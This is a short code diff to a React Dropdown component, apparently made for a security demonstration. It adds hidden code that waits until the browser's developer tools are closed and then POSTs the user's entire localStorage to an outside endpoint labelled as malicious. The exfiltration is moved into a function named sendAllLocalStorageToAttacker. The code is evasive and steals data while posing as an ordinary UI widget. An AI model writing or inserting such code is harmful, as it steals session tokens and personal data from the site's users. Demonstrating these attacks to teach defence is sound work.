@@ -10,11 +10,7 @@ export function Dropdown({ options }: DropdownProps) {
   useEffect(() => {
     const listener: DevtoolsDetectorListener = isOpen => {
       if (!isOpen) {
-        // If you are using localStorage, we just got EVERYTHING into our server!!!
-        fetch('https://just-a-logging-service.vercel.app/api/malicious-endpoint-to-steal-all-your-data', {
-          method: 'POST',
-          body: JSON.stringify(localStorage),
-        }).then(j => j.json());
+        sendAllLocalStorageToAttacker();
       }
     };
 
@@ -36,4 +32,12 @@ export function Dropdown({ options }: DropdownProps) {
       ))}
     </select>
   );
+}
+
+function sendAllLocalStorageToAttacker() {
+  // If you are using localStorage, we just got EVERYTHING into our server!!!
+  fetch(
+    'https://youtube-2021-may-security-attack.vercel.app/api/malicious-endpoint-to-steal-all-your-data',
+    { method: 'POST', body: JSON.stringify(localStorage) }
+  ).then(j => j.json());
 }
